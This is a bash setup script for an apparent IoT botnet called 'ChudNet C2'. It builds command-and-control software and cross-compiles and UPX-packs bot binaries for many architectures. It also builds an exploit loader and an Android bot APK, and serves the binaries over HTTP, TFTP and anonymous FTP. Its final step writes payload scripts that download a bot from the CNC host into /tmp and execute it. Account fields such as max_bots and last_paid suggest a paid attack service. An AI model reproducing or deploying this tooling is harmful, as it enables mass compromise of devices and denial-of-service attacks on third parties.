#!/bin/bash
set -e

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
info()  { echo -e "${CYAN}[*]${NC} $1"; }
ok()    { echo -e "${GREEN}[+]${NC} $1"; }
warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
fail()  { echo -e "${RED}[-]${NC} $1"; exit 1; }

[[ $EUID -ne 0 ]] && fail "Must run as root (sudo)"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR"
RELEASE_DIR="$HOME/release"
mkdir -p "$RELEASE_DIR"

# ──────────────────────────────────────────────
#  1. Gather config
# ──────────────────────────────────────────────
echo ""
echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║        ChudNet C2 Setup Wizard           ║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
echo ""

read -p "Enter CNC IP / domain: " CNC_HOST
[[ -z "$CNC_HOST" ]] && fail "CNC host is required"

read -p "Enter admin username: " ADMIN_USER
[[ -z "$ADMIN_USER" ]] && fail "Admin username is required"

read -s -p "Enter admin password: " ADMIN_PASS
echo ""
[[ -z "$ADMIN_PASS" ]] && fail "Admin password is required"

read -p "Enter .eth domain (ENTER to skip): " ETH_DOMAIN

CNC_TELNET=6666
CNC_BOT=7777
SSH_PORT=2222
API_PORT=9999

# Resolve domain to IP
if [[ "$CNC_HOST" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    CNC_IP="$CNC_HOST"; CNC_DOMAIN=""
else
    CNC_DOMAIN="$CNC_HOST"
    CNC_IP="$(host "$CNC_HOST" 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)"
    [[ -z "$CNC_IP" ]] && CNC_IP="$(dig +short "$CNC_HOST" 2>/dev/null | head -1)"
    [[ -z "$CNC_IP" ]] && warn "Could not resolve $CNC_HOST to IP"
fi

echo ""
info "Configuration:"
echo "  CNC Host : $CNC_HOST"
[[ -n "$CNC_DOMAIN" ]] && echo "  CNC IP   : ${CNC_IP:-unresolved}"
[[ -n "$ETH_DOMAIN" ]] && echo "  ETH Alias: $ETH_DOMAIN"
echo "  Web      : http://${CNC_HOST}:$API_PORT"
echo "  Admin    : $ADMIN_USER"
echo ""

# ──────────────────────────────────────────────
#  2. Install system packages
# ──────────────────────────────────────────────
info "Installing system packages..."
apt-get update -qq
DEPS="build-essential golang-go git curl wget xz-utils"
DEPS+=" apache2 xinetd tftpd-hpa vsftpd python3 screen unzip ufw dnsutils"
for pkg in $DEPS; do
    if ! dpkg -s "$pkg" &>/dev/null 2>&1; then
        DEBIAN_FRONTEND=noninteractive apt-get install -y "$pkg" -qq && ok "Installed $pkg"
    fi
done
ok "System packages installed"

# ──────────────────────────────────────────────
#  3. Cross-compilers (musl.cc)
# ──────────────────────────────────────────────
XCOMPILE_DIR="/etc/xcompile"
MUSL_DIR="$XCOMPILE_DIR/musl"

if [ ! -f "$MUSL_DIR/arm-linux-musleabi/bin/arm-linux-musleabi-gcc" ]; then
    info "Downloading musl.cc cross-compilers..."
    mkdir -p "$MUSL_DIR"
    cd /tmp

    DOWNLOAD_FAILED=0
    for ARCH in arm-linux-musleabi armv5l-linux-musleabi armv6-linux-musleabi \
                armv7l-linux-musleabihf i486-linux-musl mips-linux-musl \
                mipsel-linux-musl powerpc-linux-musl x86_64-linux-musl \
                sh4-linux-musl m68k-linux-musl arc-linux-musl; do
        info "  Downloading $ARCH..."

        TARBALL="/tmp/${ARCH}-cross.tgz"
        rm -f "$TARBALL"

        # try primary URL, then alternate
        curl -sL --connect-timeout 15 --max-time 120 \
            "https://musl.cc/${ARCH}-cross.tgz" -o "$TARBALL" 2>/dev/null || \
        curl -sL --connect-timeout 15 --max-time 120 \
            "https://more.musl.cc/10.2.1/${ARCH}-cross.tgz" -o "$TARBALL" 2>/dev/null || true

        if [ ! -f "$TARBALL" ] || [ ! -s "$TARBALL" ]; then
            warn "  Failed to download $ARCH"
            DOWNLOAD_FAILED=1
            continue
        fi

        # try direct extract first
        if tar -xzf "$TARBALL" -C "$MUSL_DIR" 2>/dev/null; then
            :
        else
            # fallback: the tarball may have a top-level dir; strip it
            mkdir -p "$MUSL_DIR/$ARCH"
            tar -xzf "$TARBALL" -C "$MUSL_DIR/$ARCH" --strip-components=1 2>/dev/null || {
                warn "  Failed to extract $ARCH"
                rm -rf "$MUSL_DIR/$ARCH"
                DOWNLOAD_FAILED=1
            }
        fi
        rm -f "$TARBALL"
    done

    # normalize directory names (tarballs may extract to e.g. arm-linux-musleabi-cross/)
    for d in "$MUSL_DIR"/*-cross; do
        [ -d "$d" ] || continue
        base=$(basename "$d" | sed 's/-cross//')
        [ -d "$MUSL_DIR/$base" ] && continue
        mv "$d" "$MUSL_DIR/$base" 2>/dev/null || true
    done

    chmod -R 755 "$MUSL_DIR"

    # verify at least the arm compiler exists
    if [ -x "$MUSL_DIR/arm-linux-musleabi/bin/arm-linux-musleabi-gcc" ]; then
        ok "Cross-compilers installed"
    else
        warn "Cross-compiler download incomplete ($DOWNLOAD_FAILED failures)"
        warn "  You can manually install them from https://musl.cc/"
        warn "  Bot/exploit compile will be skipped"
    fi
else
    info "Cross-compilers already installed"
fi

# ──────────────────────────────────────────────
#  4. UPX
# ──────────────────────────────────────────────
if ! command -v upx &>/dev/null; then
    info "Downloading UPX..."
    cd /tmp
    curl -sL "https://github.com/upx/upx/releases/download/v4.2.4/upx-4.2.4-amd64_linux.tar.xz" -o upx.tar.xz
    tar -xf upx.tar.xz && cp upx-4.2.4-amd64_linux/upx /usr/local/bin/upx && chmod 755 /usr/local/bin/upx
    rm -rf upx-4.2.4-amd64_linux upx.tar.xz
    ok "UPX 4.2.4 installed"
fi

# ──────────────────────────────────────────────
#  4b. Android SDK (for APK builds)
# ──────────────────────────────────────────────
ANDROID_SDK_ROOT="/opt/android-sdk"
if [ ! -d "$ANDROID_SDK_ROOT" ]; then
    info "Installing Android SDK command-line tools..."
    mkdir -p "$ANDROID_SDK_ROOT"
    cd /tmp
    curl -sL "https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip" -o cmdline-tools.zip || {
        warn "Failed to download Android SDK (APK build will be skipped)"
        ANDROID_SDK_ROOT=""
    }
    if [ -n "$ANDROID_SDK_ROOT" ]; then
        unzip -q cmdline-tools.zip -d "$ANDROID_SDK_ROOT"
        mv "$ANDROID_SDK_ROOT/cmdline-tools" "$ANDROID_SDK_ROOT/latest"
        mkdir -p "$ANDROID_SDK_ROOT/cmdline-tools"
        mv "$ANDROID_SDK_ROOT/latest" "$ANDROID_SDK_ROOT/cmdline-scripts/"
        yes | "$ANDROID_SDK_ROOT/cmdline-scripts/latest/bin/sdkmanager" --sdk_root="$ANDROID_SDK_ROOT" \
            "platforms;android-29" "build-tools;29.0.3" 2>&1 | tail -5 || warn "SDK install partial"
        rm -f cmdline-tools.zip
        ok "Android SDK installed at $ANDROID_SDK_ROOT"
    fi
else
    info "Android SDK already installed"
fi

# ──────────────────────────────────────────────
#  5. Inject CNC host into config + source
# ──────────────────────────────────────────────
info "Injecting CNC host into config and source files..."

# config/config.json — ports
sed -i "s|\"telnet_port\": 6666|\"telnet_port\": $CNC_TELNET|" config/config.json
sed -i "s|\"bot_port\": 7777|\"bot_port\": $CNC_BOT|" config/config.json
sed -i "s|\"ssh_port\": 2222|\"ssh_port\": $SSH_PORT|" config/config.json
sed -i "s|\"port\": 9999|\"port\": $API_PORT|" config/config.json

# bot/core/c2host.c — encoded CNC IP
# clean up stale file from old setup.sh versions
rm -f bot/c2host.c
python3 scripts/encode_c2.py "$CNC_HOST" > bot/core/c2host.c

# .eth domain support (resolved at runtime by bot)
if [ -n "$ETH_DOMAIN" ]; then
    info ".eth domain configured: $ETH_DOMAIN (resolved by bot at runtime)"
fi

ok "Config files updated"

# ──────────────────────────────────────────────
#  6. JSON database setup (CNC uses JSON, not SQLite)
# ──────────────────────────────────────────────
info "Setting up database..."
API_KEY=$(head -c 32 /dev/urandom | xxd -p -c 64)
DB_DIR="config/database"
mkdir -p "$DB_DIR/logs"

cat > "$DB_DIR/users.json" <<EOF
[
  {
    "username": "$ADMIN_USER",
    "password": "$ADMIN_PASS",
    "max_bots": -1,
    "admin": 1,
    "proxy_allowed": 1,
    "duration_limit": 0,
    "cooldown": 0,
    "last_paid": $(date +%s),
    "intvl": 0,
    "api_key": "$API_KEY",
    "wrc": 0
  }
]
EOF

echo '[]' > "$DB_DIR/history.json"
echo '[]' > "$DB_DIR/whitelist.json"

ok "Database ready: $DB_DIR/"
info "Admin user: $ADMIN_USER"
info "API key: $API_KEY"

# ──────────────────────────────────────────────
#  7. Build CNC
# ──────────────────────────────────────────────
info "Building CNC..."
cd "$SCRIPT_DIR/cnc"
go build -o "$RELEASE_DIR/cnc" . || fail "CNC build failed"
cd "$SCRIPT_DIR"
cp -r config "$RELEASE_DIR/config"
ok "CNC built: $RELEASE_DIR/cnc"
ok "Config copied to $RELEASE_DIR/config"

# ──────────────────────────────────────────────
#  8. Build bot (all architectures)
# ──────────────────────────────────────────────
info "Building bot for all architectures..."
compile_bot() {
    local PREFIX="$1" OUTPUT="$2" EXTRA="$3"
    local GCC="$MUSL_DIR/$PREFIX/bin/${PREFIX}-gcc"
    [ ! -x "$GCC" ] && return
    info "  Compiling $OUTPUT..."
    BOT_SRCS=$(find bot -name '*.c' | sort | tr '\n' ' ')
    "$GCC" -std=c99 -Os -fomit-frame-pointer -fno-stack-protector -s $EXTRA -static \
        -Ibot/core/headers -Ibot/attack/headers -Ibot/system/headers -Ibot/proxy/headers $BOT_SRCS -o "$RELEASE_DIR/$OUTPUT" 2>&1 || { warn "  Failed $OUTPUT"; return; }
    strip -s "$RELEASE_DIR/$OUTPUT" 2>/dev/null || true
    upx --lzma "$RELEASE_DIR/$OUTPUT" 2>/dev/null || true
    ok "  $OUTPUT ($(du -h "$RELEASE_DIR/$OUTPUT" | cut -f1))"
}

compile_bot "arm-linux-musleabi"      "chud.arm"    ""
compile_bot "armv5l-linux-musleabi"   "chud.arm5"   ""
compile_bot "armv6-linux-musleabi"    "chud.arm6"   ""
compile_bot "armv7l-linux-musleabihf" "chud.arm7"   ""
compile_bot "i486-linux-musl"         "chud.x86"    ""
compile_bot "mips-linux-musl"         "chud.mips"   ""
compile_bot "mipsel-linux-musl"       "chud.mpsl"   ""
compile_bot "powerpc-linux-musl"      "chud.ppc"    ""
compile_bot "x86_64-linux-musl"       "chud.x86_64" ""
compile_bot "sh4-linux-musl"          "chud.sh4"    ""
compile_bot "m68k-linux-musl"         "chud.m68k"   ""
compile_bot "arc-linux-musl"          "chud.arc"    ""
ok "Bot binaries built"

# ──────────────────────────────────────────────
#  9. Build exploit loader
# ──────────────────────────────────────────────
info "Building exploit loader..."
cp -r "$SCRIPT_DIR/loader/exploits" "$RELEASE_DIR/exploits"
cd "$SCRIPT_DIR/loader"
go build -o "$RELEASE_DIR/loader" . && ok "Loader built: $RELEASE_DIR/loader"
cd "$SCRIPT_DIR"
# Build all exploit binaries
"$RELEASE_DIR/loader" --build-only && ok "Exploit binaries built"

# ──────────────────────────────────────────────
#  11. Build APK (Android bot)
# ──────────────────────────────────────────────
info "Building Android APK..."
if [ -n "$ANDROID_SDK_ROOT" ] && [ -d "$ANDROID_SDK_ROOT" ]; then
    export ANDROID_HOME="$ANDROID_SDK_ROOT"
    cd "$SCRIPT_DIR/apk"
    bash build_apk.sh "$CNC_HOST" "$CNC_BOT" "" && {
        cp app/build/outputs/apk/release/*.apk "$RELEASE_DIR/" 2>/dev/null || true
        ok "APK built"
    }
    cd "$SCRIPT_DIR"
else
    warn "Android SDK not available, skipping APK build"
    warn "  To build APK manually: export ANDROID_HOME=/path/to/sdk && ./apk/build_apk.sh $CNC_HOST $CNC_BOT"
fi

# ──────────────────────────────────────────────
#  12. Serving infra
# ──────────────────────────────────────────────
info "Setting up serving infrastructure..."
rm -rf /var/www/html 2>/dev/null; mkdir -p /var/www/html/bins
rm -rf /var/lib/tftpboot 2>/dev/null; mkdir -p /var/lib/tftpboot
rm -rf /var/ftp 2>/dev/null; mkdir -p /var/ftp
cp "$RELEASE_DIR"/chud.* /var/www/html/bins/ 2>/dev/null || true
cp "$RELEASE_DIR"/chud.* /var/lib/tftpboot/ 2>/dev/null || true
cp "$RELEASE_DIR"/chud.* /var/ftp/ 2>/dev/null || true

if ! grep -q "tftp" /etc/xinetd.d/tftp 2>/dev/null; then
    cat > /etc/xinetd.d/tftp << 'TFTPEOF'
service tftp {
    protocol        = udp
    port            = 69
    socket_type     = dgram
    wait            = yes
    user            = root
    server          = /usr/sbin/in.tftpd
    server_args     = -s /var/lib/tftpboot
    disable         = no
}
TFTPEOF
    systemctl restart xinetd 2>/dev/null || service xinetd restart 2>/dev/null || true
fi

if [ -f /etc/vsftpd.conf ]; then
    sed -i 's/anonymous_enable=NO/anonymous_enable=YES/' /etc/vsftpd.conf 2>/dev/null || true
    echo "anon_root=/var/ftp" >> /etc/vsftpd.conf 2>/dev/null || true
    systemctl restart vsftpd 2>/dev/null || service vsftpd restart 2>/dev/null || true
fi

systemctl enable apache2 2>/dev/null || true
systemctl restart apache2 2>/dev/null || service apache2 start 2>/dev/null || true

ufw allow "$CNC_TELNET/tcp" 2>/dev/null || true
ufw allow "$CNC_BOT/tcp" 2>/dev/null || true
ufw allow "$SSH_PORT/tcp" 2>/dev/null || true
ufw allow "$API_PORT/tcp" 2>/dev/null || true
ufw allow 80/tcp 2>/dev/null || true
ufw allow 69/udp 2>/dev/null || true
ufw allow 21/tcp 2>/dev/null || true
ok "Serving infrastructure ready"

# ──────────────────────────────────────────────
#  13. Payload scripts
# ──────────────────────────────────────────────
info "Generating payload scripts..."
PAYLOAD_DIR="$RELEASE_DIR/payloads"
mkdir -p "$PAYLOAD_DIR"
for bin in /var/www/html/bins/chud.*; do
    [ ! -f "$bin" ] && continue
    ARCH=$(basename "$bin" | sed 's/chud\.//')
    cat > "$PAYLOAD_DIR/$ARCH.sh" << PAYEOF
#!/bin/sh
wget -q http://$CNC_HOST/bins/chud.$ARCH -O /tmp/... && chmod 755 /tmp/... && /tmp/... && rm -f /tmp/...
PAYEOF
    chmod +x "$PAYLOAD_DIR/$ARCH.sh"
done
ok "Payloads in $PAYLOAD_DIR"

# ──────────────────────────────────────────────
#  Summary
# ──────────────────────────────────────────────
echo ""
echo -e "${GREEN}╔══════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║       ChudNet Setup Complete!            ║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════╝${NC}"
echo ""
echo -e "  Admin:   ${CYAN}$ADMIN_USER${NC}"
echo -e "  Web:     ${CYAN}http://$CNC_HOST:$API_PORT${NC}"
echo -e "  API key: ${CYAN}$API_KEY${NC}"
echo -e "  Rebuild: ${CYAN}bash build.sh${NC}"
echo ""

cd "$SCRIPT_DIR"
